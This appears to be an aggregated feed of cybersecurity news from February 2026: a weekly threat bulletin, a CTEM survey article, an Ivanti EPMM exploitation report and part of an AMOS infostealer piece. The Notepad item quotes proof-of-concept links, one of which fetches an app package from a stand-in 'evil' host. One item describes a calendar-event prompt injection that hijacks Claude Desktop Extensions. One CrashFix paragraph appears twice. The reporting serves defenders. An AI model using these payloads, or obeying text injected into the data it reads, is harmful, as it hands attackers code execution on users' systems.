[TAM METİN - 8671 kelime]
Threat activity this week shows one consistent signal — attackers are leaning harder on what already works. Instead of flashy new exploits, many operations are built around quiet misuse of trusted tools, familiar workflows, and overlooked exposures that sit in plain sight.

Another shift is how access is gained versus how it’s used. Initial entry points are getting simpler, while post-compromise activity is becoming more deliberate, structured, and persistent. The objective is less about disruption and more about staying embedded long enough to extract value.

There’s also growing overlap between cybercrime, espionage tradecraft, and opportunistic intrusion. Techniques are bleeding across groups, making attribution harder and defense baselines less reliable.

Below is this week’s ThreatsDay Bulletin — a tight scan of the signals that matter, distilled into quick reads. Each item adds context to where threat pressure is building next.

Notepad RCE via Markdown Links

Microsoft Patches Notepad Flaw


      Microsoft has patched a command injection flaw (CVE-2026-20841, CVSS score: 8.8) in its Notepad app that could result in remote code execution. "Improper neutralization of special elements used in a command ('command injection') in Windows Notepad App allows an unauthorized attacker to execute code over a network," Microsoft said. An attacker could exploit this flaw by tricking a user into clicking a malicious link inside a Markdown file opened in Notepad, causing the application to run remote files. "The malicious code would execute in the security context of the user who opened the Markdown file, giving the attacker the same permissions as that user," the tech giant added. Proof-of-concept (PoC) exploits show that the vulnerability can be triggered by creating a Markdown file with "file://" links that point to executable files ("file://C:/windows/system32/cmd.exe") or contain special URIs ("ms-appinstaller://?source=https://evil/xxx.appx") to run arbitrary payloads. The issue was fixed as part of its monthly Patch Tuesday update this week. Microsoft added Markdown support to Notepad on Windows 11 last May.

APT Pressure Intensifies on Taiwan

Taiwan Becomes Target of APT Attacks


      TeamT5 said tracked more than 510 advanced persistent threat (APT) operations affecting 67 countries globally in 2025, out of which 173 attacks targeted Taiwan. "Taiwan’s role in geopolitical tensions and values in the global technology supply chain makes it uniquely vulnerable for adversaries who seek intelligence or long-term access to achieve political and military objectives," the security vendor said. "Taiwan is more than just a target – it functions as a proving ground where China-nexus APTs test and refine their tactics before scaling them to other environments."

Node.js Stealer Hits Windows

LTX Stealer Targets Windows Systems


      A new Node.js information stealer named LTX Stealer has been spotted in the wild. Targeting Windows systems and distributed via a heavily obfuscated Inno Setup installer, the malware conducts large-scale credential harvesting from Chromium-based browsers, targets cryptocurrency-related artifacts, and stages the collected data for exfiltration. "The campaign relies on a cloud-backed management infrastructure, where Supabase is used exclusively as the authentication and access-control layer for the operator panel, while Cloudflare is leveraged to front backend services and mask infrastructure details," CYFIRMA said.

Marco Stealer Expands Data Theft

Marco Stealer Emerges in the Wild


      Another new Windows-oriented information stealer is Marco Stealer, which was first observed in June 2025. Delivered via a downloader in a ZIP archive, it mainly targets browser data, cryptocurrency wallet information, files from popular cloud services like Dropbox and Google Drive, and other sensitive files stored on the victim's system. "Marco Stealer relies on encrypted strings that are decrypted only at runtime to avoid static analysis. In addition, the information stealer uses Windows APIs to detect anti-analysis tools like Wireshark, x64dbg, and Process Hacker," Zscaler ThreatLabz said. "Stolen data is encrypted using AES-256 before being sent to C2 servers via HTTP POST requests."

Telegram Sessions Hijacked via OAuth Abuse

Social Engineering Campaign Targets Telegram Accounts


      A new account takeover campaign has been observed abusing Telegram's native authentication workflows to obtain fully authorized user sessions. In one variant, victims are prompted to scan a QR code on bogus sites using the Telegram mobile application, initiating a legitimate Telegram login attempt tied to attacker-controlled API credentials. Telegram then sends an in-app authorization prompt to the victim's existing session. Alternatively, users can also enter their country code, phone number, and verification code (if enabled) on a fake web page, which causes the data to be relayed to Telegram's official authentication APIs. Upon successful verification, Telegram issues an in-app authorization request as before. "Unlike traditional phishing attacks that rely solely on credential harvesting or token replay, this campaign leverages attacker-controlled Telegram API credentials and integrates directly with Telegram's legitimate login and authorization infrastructure," CYFIRMA noted. "By inducing victims to approve in-app authorization prompts under false pretenses, the attackers achieve complete session compromise while minimizing technical anomalies and user suspicion."

Discord Expands Global Age Checks

Discord Announces Age Verification Plans


      Discord has announced it will require all users globally to verify their ages by sharing video selfies or providing government IDs to access certain content. Additionally, it will implement an age inference model, a new system that runs in the background to help determine whether an account belongs to an adult, without always requiring users to verify their age. The company has assured that video selfies don't leave a user's device, that identity documents submitted to third-party vendors, in this case k-ID, are "deleted quickly" or "immediately" after age confirmation, and that a user's age verification status cannot be seen by other users. However, concerns have been raised about whether Discord can be trusted with their most sensitive information, especially in the aftermath of a security breach of a third-party service that Discord previously relied on to verify ages in the U.K. and Australia. The incident led to the theft of government IDs of 70,000 Discord users. In a statement given to Ars Technica, k-ID said the age estimation technology runs entirely on device and no third-parties store personal data shared during age checks. The move comes at a time when laws requiring age verification on social media platforms are being adopted across the world. Discord confirmed that "a phased global rollout" would begin in "early March," at which point all users globally would be defaulted to “teen-appropriate" experiences.

GuLoader Refines Evasion Tradecraft

GuLoader Continues to Evolve


      A new analysis of the GuLoader malware has revealed that it employs polymorphic code to dynamically construct constants during execution and exception-based control flow obfuscation to conceal its functionality and evade detection. Besides introducing sophisticated exception-handling mechanisms to complicate analysis, the malware attempts to bypass reputation-based rules by hosting payloads on trusted cloud services such as Google Drive and OneDrive. First observed in December 2019, GuLoader serves primarily as a downloader for Remote Access Trojans (RATs) and information stealers.

$73.6M Pig-Butchering Scam Sentence

Man Sentenced to 20 Years in Prison for Crypto Scam


      Daren Li, 42, a dual national of China and St. Kitts and Nevis has been sentenced in absentia in the U.S. to the statutory maximum of 20 years in prison and three years of supervised release for his international cryptocurrency investment scheme known as pig butchering or romance baiting that defrauded victims of more than $73.6 million. Li pleaded guilty to his crime in November 2024. However, the defendant cut off his ankle monitor and fled the country in December 2025. His present whereabouts are unknown. "As part of his plea agreement, Li admitted that unindicted members of the conspiracy would contact victims directly through unsolicited social-media interactions, telephone calls and messages, and online dating services," the U.S. Justice Department said. "The unindicted co-conspirators would gain the trust of victims by establishing either professional or romantic relationships with them, often communicating by electronic messages sent via end-to-end encrypted applications." The co-conspirators established spoofed domains and websites that resembled legitimate cryptocurrency trading platforms and tricked victims into investing in cryptocurrency through these fraudulent platforms after gaining their trust. Li also confessed that he would direct co-conspirators to open U.S. bank accounts established on behalf of 74 shell companies and would monitor the receipt of interstate and international wire transfers of victim funds. "Li and other co-conspirators would receive victim funds in financial accounts that they controlled and then monitor the conversion of victim funds to virtual currency," the department said.

0-Click AI Prompt RCE Risk

0-Click Flaw in Claude Desktop Extensions


      A zero-click remote code execution vulnerability (CVSS score: 10.0) in Claude Desktop Extensions (DXT) could be exploited to silently compromise a system by a simple Google Calendar event when a user issues a harmless prompt like "Please check my latest events in google cal[endar] and then take care of it for me." The problem stems from how MCP-based systems like Claude DXT autonomously chain together different tools and external connectors to fulfil user requests without enforcing proper security boundaries. The phrase "take care of it" does the heavy lifting here, as the artificial intelligence (AI) assistant interprets it as a justification to execute arbitrary instructions embedded in those events without seeking users' permission. The flaw impacts more than 10,000 active users and 50 DXT extensions, according to LayerX. "Unlike traditional browser extensions, Claude Desktop Extensions run unsandboxed with full system privileges," the browser security company said. "As a result, Claude can autonomously chain low-risk connectors (e.g., Google Calendar) to high-risk local executors, without user awareness or consent. If exploited by a bad actor, even a benign prompt ('take care of it'), coupled with a maliciously worded calendar event, is sufficient to trigger arbitrary local code execution that compromises the entire system." Anthropic has opted not to fix the issue at this time. A similar Google Gemini prompt injection flaw was disclosed by Miggo Security last month.

Data-Theft Ransomware Surges

Coinbase Cartel Claims Over 60 Victims


      A nascent ransomware group called Coinbase Cartel has claimed more than 60 victims since it first emerged in September 2025. "Coinbase Cartel operations are marked by an insistence on stealing data while leaving systems available rather than complementing data theft with the use of encryptors that prohibit system access," Bitdefender said. The healthcare, technology, and transportation industries represent a major chunk of Coinbase Cartel's greatest victim demographic to date. The healthcare organizations impacted by the threat actor are primarily based in the U.A.E. Some of the other prominent groups that are focused on only data theft are World Leaks and PEAR (Pure Extraction and Ransom). The development paints a picture of an ever-evolving ransomware landscape populated by new and old actors, even as the threat is getting increasingly professionalized as attackers streamline operations. According to data from Cyble, 6,604 ransomware attacks were recorded in 2025, up 52% from the 4,346 attacks claimed by ransomware groups in 2024.

Google Expands Privacy Takedowns

Google Adds New Options "Results about you" 


      Google has expanded its "Results about you" tool to give users more control over sensitive personal information and added a way to request removal of non-consensual explicit images from search results, as well as other details like driver's license numbers, passport numbers, and Social Security numbers. "We understand that removing existing content is only part of the solution," Google said. "For added protection, the new process allows you to opt in to safeguards that will proactively filter out any additional explicit results that might appear in similar searches."

Monitoring Tools Used for Ransomware

Crazy Ransomware Gang Abuses Net Monitor and SimpleHelp 


      Threat actors have been observed leveraging Net Monitor, a commercial workforce monitoring tool, with SimpleHelp, a legitimate remote monitoring and management (RMM) platform, as part of attacks designed to deploy Crazy ransomware. The two incidents, believed to be the work of the same threat actor, took place in January and February 2026. Net Monitor comes with various capabilities that go beyond employee productivity tracking, including reverse shell connections, remote desktop control, file management, and the ability to customize service and process names during installation. These features, coupled with SimpleHelp's remote access functionality, make them attractive tools for attackers looking to blend into enterprise environments without deploying traditional malware. What's more, Net Monitor for Employees Professional bundles a pseudo-terminal ("winpty-agent.exe") that facilitates full command execution. Bad actors have been found to leverage this aspect to conduct reconnaissance, deliver additional payloads, and deploy secondary remote access channels, turning it into a functional remote access trojan. "In the cases observed, threat actors used these two tools together, using Net Monitor for Employees as a primary remote access channel and SimpleHelp as a redundant persistence layer, ultimately leading to the attempted deployment of Crazy ransomware," Huntress said.

0APT Victim Claims Questioned

0APT's 200 Victim Count Likely a Hoax


      A threat actor called 0APT appears to be falsely claiming that it has breached over 200 victims within a span of a week since launching their data leak site on January 28, 2026. Further analysis has determined that the victims are a blend of wholly fabricated generic company names and recognizable organizations that threat actors have not breached, GuidePoint's Research and Intelligence Team said. The data leak site went offline on February 8, 2026, before resurfacing the next day with a list of more than 15 very large multinational organizations. "0APT is likely operating in this deceptive manner in order to support extortion of uninformed victims, re-extortion of historical victims from other groups, defrauding of potential affiliates, or to garner interest in a nascent RaaS group," security researcher Jason Baker noted. While signs suggest that the group may be bluffing about its victim count, the Windows and Linux ransomware samples have been found to be fully operational, per Halcyon. It's worth pointing out that ransomware groups like RansomedVC have listed fabricated attacks on their data leak sites to deceive victims. Viewed in that light, 0APT's exaggerated claims are likely an attempt to gain visibility and momentum among its peers. Its origins remain unknown.

SYSTEM RCE via Named Pipe

Flaw in Quest Desktop Authority Detailed


      A high-risk security vulnerability (CVE-2025-67813, CVSS score: 5.3) within Quest Desktop Authority could allow attackers to execute remote code with SYSTEM privileges. "Quest KACE Desktop Authority exposes a named pipe (ScriptLogic_Server_NamedPipe_9300) running as SYSTEM that accepts connections from any authenticated domain user over the network," NetSPI said. The named pipe implements a custom IPC protocol that supports dangerous operations, including arbitrary command execution, DLL injection, credential retrieval, and COM object invocation. Any authenticated user on the network can achieve remote code execution as a local administrator on hosts running the Desktop Authority agent.

AI Traffic Scans to Block VPNs

Russia to Analyze Internet Traffic Using AI to Flag VPN Usage


      Russia's internet watchdog will use artificial intelligence (AI) technology to analyze internet traffic and restrict the operation of VPN services, Forbes Russia reported. The Roskomnadzor is expected to spend close to $30 million to develop the internet traffic filtering mechanism this year. The Russian government has blocked access to tens of VPN apps in recent years. It also maintains a registry of banned websites.

Mispadu Expands Banking Attacks

Mexico and Brazil Targeted by Mispadu Trojan


      Cofense said it has observed Mispadu campaigns targeting Latin America, particularly Mexico and Brazil, and to a lesser extent in Spain, Italy, and Portugal, with phishing emails containing HTML Application (HTA) attachments that are designed to bypass Secure Email Gateways (SEGs) to reach the inboxes of employees across the world. "The only variation is that sometimes the URL delivering the HTA files is embedded in an attached, password-protected PDF rather than embedded in the email itself," Cofense said. "In all recent campaigns, Mispadu makes use of an AutoIT loader and various legitimate files to run the malicious content. Each step of the delivery chain from the attached PDF to the AutoIT script is dynamically generated. This means that every hash except for the AutoIT compiler is unique to each install, further frustrating EDR." Recent iterations of the banking trojan come with the ability to self-propagate on infected hosts via email and expand the target online banking websites to include banks outside of Latin America as well as cryptocurrency-based exchanges.

ScreenConnect Deployed via Phish

Phishing Campaign Delivers ConnectWise ScreenConnect for Remote Access


      In a phishing campaign documented by Forcepoint, spoofed emails have been found to deliver a malicious .cmd attachment that escalates privileges, disables Windows SmartScreen, removes the mark-of-the-web (MotW) to bypass security warnings, and ultimately installs ConnectWise ScreenConnect. The campaign has targeted organizations across the U.S., Canada, the U.K., and Northern Ireland, focusing on sectors with high-value data, including government, healthcare, and logistics companies. Recent phishing attacks have also abused web services from Amazon, like Simple Storage Service (S3) buckets, Amazon Simple Email Service (SES), and Amazon Web Services (AWS) Amplify to slip past email security controls and launch credential phishing attacks. Other phishing attacks have embraced uncommon techniques like using edited versions of legitimate business emails to deliver convincingly spoofed emails to recipients. "These emails work by having the threat actor create an account on a legitimate service and input arbitrary text into a field that will later be included in outgoing emails," Cofense said. "After this is done, the threat actor would need to receive a legitimate email that happens to include the malicious text that was created by the threat actor. Once the email is received, the threat actor can then redirect the email to the intended victims."

CrashFix Delivers SystemBC

CrashFix Variant Attack Delivers Python Implants and SystemBC 


      A variant of the ClickFix attack called CrashFix has been used to deliver malicious payloads consistent with a known malware called SystemBC. Unlike the CrashFix-style social engineering flow documented by Huntress and Microsoft, the attack stands out because it did not involve the use of a malicious browser extension. "Instead, the victim was convinced to execute a command via the Windows Run dialog (Win+R) as seen with traditional ClickFix," Binary Defense said. "This command abused a legitimate Windows binary -- finger.exe -- copied from System32, renamed, and executed from a user-writable directory. The output of this execution was piped directly into cmd.exe, acting as a delivery mechanism for an obfuscated PowerShell payload." The PowerShell code then retrieves follow-on content, including Python backdoors and a DLL implant that overlaps with SystemBC, from attacker-controlled infrastructure, while taking steps to fingerprint the host and clean up artifacts on disk. "The coexistence of Python backdoors and a reflective DLL implant highlights a deliberate defense-evasion and persistence strategy," the company said. "By mixing scripting-based and native implants, the attacker reduced reliance on any single execution method, making complete eviction more difficult."

"Instead, the victim was convinced to execute a command via the Windows Run dialog (Win+R) as seen with traditional ClickFix," Binary Defense said. "This command abused a legitimate Windows binary -- finger.exe -- copied from System32, renamed, and executed from a user-writable directory. The output of this execution was piped directly into cmd.exe, acting as a delivery mechanism for an obfuscated PowerShell payload." The PowerShell code then retrieves follow-on content, including Python backdoors and a DLL implant that overlaps with SystemBC, from attacker-controlled infrastructure, while taking steps to fingerprint the host and clean up artifacts on disk. "The coexistence of Python backdoors and a reflective DLL implant highlights a deliberate defense-evasion and persistence strategy," the company said. "By mixing scripting-based and native implants, the attacker reduced reliance on any single execution method, making complete eviction more difficult."

Bing Ads Funnel Tech Scams

Fake Bing Ads Leak to Tech Support Scams


      Malicious ads served on Bing search results when searching for sites like Amazon are being used to redirect unsuspecting users to tech support scam links hosted in Azure Blob Storage. The campaign targeted healthcare, manufacturing, and technology sectors in the U.S. "Clicking on the malicious ad sent the victims to highswit[.]space, a newly registered domain hosting an empty WordPress site, which then redirected them to one of the Azure Blob Storage containers, which served a typical tech support scam site," Netskope Threat Labs said.

Chinese VPN Infra Footprint Expands

Chinese VPN Used by Devices in Russia, China, Myanmar, Iran, and Venezuela


      A Chinese virtual private network (VPN) provider named LVCHA VPN has been used by devices in Russia, China, Myanmar, Iran, and Venezuela. It also has an Android app that's directly hosted on its website ("lvcha[.]in") and distributed via the Google Play Store. Further analysis of the domain has uncovered a cluster of nearly 50 suspicious domains, all of which promote the same VPN. "Whenever we see campaigns promoting suspicious downloads or products using so many domains, it can indicate that the operator is rotating domains to work around country-level firewalls in regions where they’re trying to promote distribution," Silent Push said.

Grid Attack Triggers Western Alerts

U.K. and U.S. Issues Warning After Poland Energy Grid Cyber Attack


      Following a late December 2025 coordinated cyber attack on Poland's power grid, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) has published a bulletin for critical infrastructure owners and operators. CISA said vulnerable edge devices remain a prime target for threat actors, OT devices without firmware verification can be permanently damaged, and threat actors leverage default credentials to pivot onto the HMI and RTUs. "Operators should prioritize updates that allow firmware verification when available," the agency added. "Operators should immediately change default passwords and establish requirements for integrators or OT suppliers to enforce password changes in the future." In a similar development, Jonathan Ellison, director for national resilience at the National Cyber Security Centre (NCSC), has urged critical infrastructure operators in the country to act now and have incident response plans or playbooks in place to respond to such threats. "Although attacks can still happen, strong resilience and recovery plans reduce both the chances of an attack succeeding and the impact if one does," Ellison said.

Telnet Traffic Abruptly Collapses

Global Telnet Traffic Dropped in Mid-January 2026 


      Threat intelligence firm GreyNoise said it observed a steep decline in global Telnet traffic on January 14, 2026, six days before a security advisory for CVE-2026-24061 went public on January 20. CVE-2026-24061 relates to a critical vulnerability in the GNU InetUtils telnet daemon that could result in an authentication bypass. Data gathered by GreyNoise shows that the hourly volume of Telnet sessions dropped 65% on January 14 at 21:00 UTC, then fell 83% within two hours. Daily sessions have declined from an average of 914,000 (from December 1, 2025, to January 14, 2026) to around 373,000, equating to a 59% reduction that has persisted as of February 10, 2026. "Eighteen ASNs with significant pre-drop telnet volume (>50K sessions each) went to absolute zero after January 15," the company said. "Five entire countries vanished from GreyNoise telnet data: Zimbabwe, Ukraine, Canada, Poland, and Egypt. Not reduced to zero." Among the 18 ASNs included were British Telecom, Charter/Spectrum, Cox Communications, and Vultr. Although correlation does not imply causation, GreyNoise has raised the possibility that the telecom operators likely received advance warning about CVE-2026-24061, allowing them to act on it at the infrastructure level. "A backbone or transit provider — possibly responding to a coordinated request, possibly acting on their own assessment — implemented port 23 filtering [to block telnet traffic] on transit links," it said.

New Loaders Fuel Stealer Campaigns

New RenEngine and Foxveil Malware Loaders Spotted 


      Cyderes and Cato Networks have detailed new previously undocumented malware loaders dubbed RenEngine Loader and Foxveil that have been used to deliver next-stage payloads. The Foxveil malware campaign has been active since August 2025. It's engineered to establish an initial foothold, complicate analysis efforts, and retrieve next-stage shellcode payloads from threat actor-controlled staging hosted on trusted platforms like Cloudflare Pages, Netlify, and Discord. Attacks leveraging RenEngine Loader, on the other hand, have employed illegally modified game installers distributed via piracy platforms to deliver the malware alongside the playable content. More than 400,000 global victims are estimated to have been impacted, with most of them located in India, the U.S., and Brazil. The activity has been operational since April 2025. "RenEngine Loader decrypts, stages, and transfers execution to Hijack Loader, enabling rapid tooling evolution and flexible capability deployment," Cyderes said. "By embedding a modular, stealth-focused second-stage loader inside a legitimate Ren’Py launcher, the attackers closely mimic normal application behavior, significantly reducing early detection." The end goal of the attack is to deploy an information stealer called ACR Stealer.

Looker RCE Chain Disclosed

Flaws in Google Looker 


      Two novel security vulnerabilities have been disclosed in Google Looker that could be exploited by an attacker to fully compromise a Looker instance. This includes a remote code execution (RCE) chain via Git hook overrides and an authorization bypass flaw via internal database connection abuse. Successful exploitation of the flaws could allow an attacker to run arbitrary code on the Looker server, potentially leading to cross-tenant access, as well as exfiltrate the full internal MySQL database via error-based SQL injection, according to Tenable. "The vulnerabilities allowed users with developer permissions in Looker to access both the underlying system hosting Looker, and its internal database," Google said. Collectively tracked as CVE-2025-12743, aka LookOut (CVSS score: 6.5), they were patched by Google in September 2025. While the fixes have been applied to cloud instances, users of self-hosted Looker instances are advised to update to the latest supported version.

Trojanized 7-Zip Spreads Proxyware

Malicious 7-Zip Site Distributes Fake Installer with Proxy 


      A fake installer for the 7-Zip file archiver tool downloaded from 7zip[.]com (the legitimate domain is 7-zip[.]org) is being used to drop a proxy component that enrolls the infected host into a residential proxy node. This allows third parties to route traffic through the victim's IP address while concealing their own origins. The installer is digitally signed with a now-revoked certificate originally issued to Jozeal Network Technology Co., Limited. The campaign has been codenamed upStage Proxy by security researcher Luke Acha, who discovered it late last month. "The operators behind 7zip[.]com distributed a trojanized installer via a lookalike domain, delivering a functional copy of 7-Zip File Manager alongside a concealed malware payload," Malwarebytes said. The 7-Zip lure appears to be part of a broader effort that uses trojanized installers for HolaVPN, TikTok, WhatsApp, and Wire VPN. Attack chains involve using YouTube tutorials as a malware distribution vector to direct unsuspecting users to the bogus site, once again highlighting the abuse of trusted platforms.

AI-Built VoidLink Expands Reach

More Details About VoidLink Emerge


VoidLink is a sophisticated Linux-based command-and-control (C2) framework capable of long-term intrusion across cloud and enterprise environments. First documented by Check Point last month, ongoing analyses of the malware have revealed that it may have been developed by a Chinese-speaking developer using an artificial intelligence (AI) model with limited human review. Ontinue, in a report published this week, said it found "strong indicators" that the implant was built using a large language model (LLM) coding agent. "It fingerprints cloud environments across AWS, GCP, Azure, Alibaba Cloud, and Tencent Cloud, harvesting credentials from environment variables, config directories, and instance metadata APIs," security researcher Rhys Downing said. "It detects container runtimes and includes plugins for container escape and Kubernetes privilege escalation. A kernel-level rootkit adapts its stealth approach based on the host's kernel version." Cisco Talos said it has observed the modular framework in campaigns undertaken by a new threat actor codenamed UAT-9921, which is believed to have been active since 2019. The cybersecurity company said it also found "clear indications" of a Windows equivalent of VoidLink that comes with the ability to load plugins. "UAT-9921 uses compromised hosts to install VoidLink command and control (C2), which are then used to launch scanning activities both internal and external to the network," Talos researchers said.

Taken together, these developments show how threat actors are balancing speed with patience — moving fast where defenses are weak, and slowing down where stealth matters more than impact. The result is activity that blends into normal operations until damage is already underway.

For defenders, the challenge isn’t just blocking entry anymore. It’s recognizing misuse of legitimate access, spotting abnormal behavior inside trusted systems, and closing gaps that don’t look dangerous on the surface.

The briefs that follow aren’t isolated incidents. They’re fragments of a wider operating picture — one that keeps evolving week after week.

[2] The Hacker News - The CTEM Divide: Why 84% of Security Programs Are Falling Behind
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 16:00:00 +0530
Link: https://thehackernews.com/2026/02/the-ctem-divide-why-84-of-security.html

[TAM METİN - 668 kelime]
A new 2026 market intelligence study of 128 enterprise security decision-makers (available here) reveals a stark divide forming between organizations – one that has nothing to do with budget size or industry and everything to do with a single framework decision. Organizations implementing Continuous Threat Exposure Management (CTEM) demonstrate 50% better attack surface visibility, 23-point higher solution adoption, and superior threat awareness across every measured dimension. The 16% who've implemented it are pulling away. The 84% who haven't are falling behind.

The Demographics of the Divide

The research surveyed a senior cohort: 85% of respondents are Manager-level or above, representing organizations where 66% employ 5,000+ people across finance, healthcare, and retail sectors.

Download the full research here →

If you aren’t familiar, CTEM involves shifting from "patch everything reactively" to "continuously discover, validate, and prioritize risk exposures that can actually hurt the business." It's widely discussed in cybersecurity now as a next-generation evolution of exposure/risk management, and the new report reinforces Gartner’s view that businesses adopting it will consistently demonstrate stronger security outcomes than those that don’t.

Awareness Is High. Adoption Is Rare.

One surprising finding: There doesn’t seem to be a problem with awareness, just implementation. 87% of security leaders recognize the importance of CTEM, but only 16% have translated that awareness into operational reality. So, if they've heard of it, why aren't they using it?

The gap between awareness and implementation reveals modern security's central dilemma: which priority wins? Security leaders understand the CTEM conceptually but struggle to sell its benefits in the face of organizational inertia, competing priorities, and budget constraints that force impossible tradeoffs. The challenge of gaining management buy-in is one reason why we prepared this report: to provide the statistics that make the business case impossible to ignore.

Complexity is the New Multiplier

For example: Beyond a certain threshold, manual tracking of all the additional integrations, scripts, and dependencies breaks down, ownership blurs, and blind spots multiply. The research makes it clear that attack surface complexity is not just a management challenge; it's a direct risk multiplier.

We can see this clearly in the graph below. Attack rates rise linearly from 5% (0-10 domains) to 18% (51-100 domains), then rise steeply past 100 domains.

This sudden increase is driven by the ‘visibility gap’, the gulf between the assets a company is responsible for monitoring and those it’s aware of. Each additional domain can add dozens of connected assets, and when the count climbs past 100, this can translate to thousands of additional scripts: each one a possible attack vector. Traditional snapshot security cannot hope to log and monitor them all. Only CTEM-driven programs can provide the oversight to continuously identify and validate the dark assets hiding in this visibility gap – before attackers do.

Security leaders are currently facing a 'perfect storm' of demands. At a time when 91% of CISOs report an increase in third-party incidents, average breach costs have climbed to $4.44M, and PCI DSS 4.0.1 brings stricter monitoring and the ever-present specter of penalties. With this in mind, the report shows that attack surface management has become an issue for the boardroom as much as the server room, and the C-suite reader can only conclude that continuing to trust manual oversight and periodic controls to manage such a complex, high-stakes challenge would be self-destructive.

One of the clearest signals in this research comes from the peer benchmarking data. When organizations compare themselves side by side – by attack surface size, visibility, tooling, and outcomes – a pattern emerges that is difficult to ignore: beyond a certain level of complexity, traditional security approaches stop scaling.

The takeaway from the peer benchmarks is clear: below a certain level of exposure, organizations can rely on periodic controls and manual oversight. Above it, those models no longer hold. For security leaders operating in high-complexity environments, the question is no longer whether CTEM is valuable – it is whether their current approach can realistically keep up without it.

[3] The Hacker News - 83% of Ivanti EPMM Exploits Linked to Single IP on Bulletproof Hosting Infrastructure
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 13:02:00 +0530
Link: https://thehackernews.com/2026/02/83-of-ivanti-epmm-exploits-linked-to.html

[TAM METİN - 497 kelime]
A significant chunk of the exploitation attempts targeting a newly disclosed security flaw in Ivanti Endpoint Manager Mobile (EPMM) can be traced back to a single IP address on bulletproof hosting infrastructure offered by PROSPERO.

Threat intelligence firm GreyNoise said it recorded 417 exploitation sessions from 8 unique source IP addresses between February 1 and 9, 2026. An estimated 346 exploitation sessions have originated from 193.24.123[.]42, accounting for 83% of all attempts.

The malicious activity is designed to exploit CVE-2026-1281 (CVSS scores: 9.8), one of the two critical security vulnerabilities in EPMM, along with CVE-2026-1340 that could be exploited by an attacker to achieve unauthenticated remote code execution. Late last month, Ivanti acknowledged it's aware of a "very limited number of customers" who were impacted following the zero-day exploitation of the issues.

Since then, multiple European agencies, including the Netherlands' Dutch Data Protection Authority (AP), Council for the Judiciary, the European Commission, and Finland's Valtori, have disclosed that they were targeted by unknown threat actors using the vulnerabilities.

Further analysis has revealed that the same host has been simultaneously exploiting three other CVEs across unrelated software -

CVE-2026-21962 (Oracle WebLogic) - 2,902 sessions

CVE-2026-24061 (GNU InetUtils telnetd) - 497 sessions

CVE-2025-24799 (GLPI) - 200 sessions

"The IP rotates through 300+ unique user agent strings spanning Chrome, Firefox, Safari, and multiple operating system variants," GreyNoise said. "This fingerprint diversity, combined with concurrent exploitation of four unrelated software products, is consistent with automated tooling."

It's worth noting that PROSPERO is assessed to be linked to another autonomous system called Proton66, which has a history of distributing desktop and Android malware like GootLoader, Matanbuchus, SpyNote, Coper (aka Octo), and SocGholish.

GreyNoise also pointed out that 85% of the exploitation sessions beaconed home via the domain name system (DNS) to confirm "this target is exploitable" without deploying any malware or exfiltrating data.

The disclosure comes days after Defused Cyber reported a "sleeper shell" campaign that deployed a dormant in-memory Java class loader to compromised EPMM instances at the path "/mifs/403.jsp." The cybersecurity company said the activity is indicative of initial access broker tradecraft, where threat actors establish a foothold to sell or hand off access later for financial gain.

"That pattern is significant," it noted. "OAST [out-of-band application security testing] callbacks indicate the campaign is cataloging which targets are vulnerable rather than deploying payloads immediately. This is consistent with initial access operations that verify exploitability first and deploy follow-on tooling later."

Ivanti EPMM users are recommended to apply the patches, audit internet-facing Mobile Device Management (MDM) infrastructure, review DNS logs for OAST-pattern callbacks, and monitor for the /mifs/403.jsp path on EPMM instances, and block PROSPERO's autonomous system (AS200593) at the network perimeter level.

"EPMM compromise provides access to device management infrastructure for entire organizations, creating a lateral movement platform that bypasses traditional network segmentation," GreyNoise said. "Organizations with internet-facing MDM, VPN concentrators, or other remote access infrastructure should operate under the assumption that critical vulnerabilities face exploitation within hours of disclosure."

[4] BleepingComputer - AMOS infostealer targets macOS through a popular AI app  
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 09:25:38 -0500

[TAM METİN - 1352 kelime]
Infostealers like Atomic MacOS Stealer (AMOS) represent far more than a standalone malware. They are foundational components of a mature cybercrime economy built around harvesting, trading, and operationalizing stolen digital identities.

Rather than acting as the end goal, modern stealers function as large-scale data collection engines that feed underground markets, where stolen credentials, sessions, and financial data are bought and sold to fuel account takeovers, fraud, and follow-on intrusions.

What makes these campaigns particularly effective is their highly opportunistic social engineering approach: attackers continuously adapt to technology trends, abusing trusted platforms, popular software, search engines, and even emerging AI ecosystems to trick users into executing malware themselves.

This combination of industrialized data monetization and adaptive social engineering has made infostealers one of the most reliable and scalable entry points in today’s cybercrime landscape.

In the new 2026 Enterprise Infostealer Identity Exposure report, Flare researchers highlight the growing dominance of infostealers within the cybercrime economy and the expanding impact of identity exposure on organizations.

In this article, we examine the AMOS infostealer as a case study, exploring its evolution, operational model, and real-world activity across its active years.

How Do Infostealers Work?

Infostealers operate as one of the most critical enablers in the modern cybercrime kill chain because they transform a single infection into large-scale credential, session, and identity compromise.

ClawHavoc - The Most Recent Campaign

Recent research by Koi security reminded us that AMOS infostealer dissemination techniques are cunningly designed to find weaknesses and exploit every segment of technology users to steal their credentials.

The research describes ClawHavoc as a large-scale supply-chain campaign targeting the OpenClaw and ClawHub ecosystem (A very popular personal AI assistant) by poisoning the skill marketplace itself.

While the specific details are impressive, what matters more is the underlying tactic. AMOS distributors are capitalizing on OpenClaw's popularity as AI-hyped software.

As users rush to install it for personal or organizational gains, attackers see an opportunity to bundle AMOS malware within it to steal valuable PII, credentials, and sensitive data.

The delivery model: attackers uploaded skills (OpenClaw add-ons) that looked legitimate: crypto tools, productivity utilities, YouTube helpers, finance or Google Workspace integrations, etc.

Once installed, the malware could steal credentials, crypto wallet data, browser sessions, SSH keys, and other sensitive data, highlighting how AI agent extension ecosystems can become high-impact distribution channels when marketplace vetting is weak.

This is the latest campaign, let’s remember how it all started…

Monitor Stealer Logs Before Attackers Strike

Flare tracks over 1 million new stealer logs weekly from dark web markets and Telegram channels.

AMOS the Malware - First Sighting of AMOS

AMOS first appeared around May 2023 on a Telegram channel.

Stating its capabilities, which include exporting passwords from the Mac keychain, file grabber, system info, and macOS password exfiltration, browser session theft, crypto wallet data theft with various infostealer management capabilities (web-panel, tests, Telegram logs, etc).

Back then, the cost was $1000 per month, paid through USDT(TRC20), ETH, or BTC.

Since then, AMOS infostealer has become a part of the underground ecosystem, threat actors are willing to buy stealer logs that were extracted from infostealers (such as AMOS) in order to use them as an initial access to their own nefarious business.

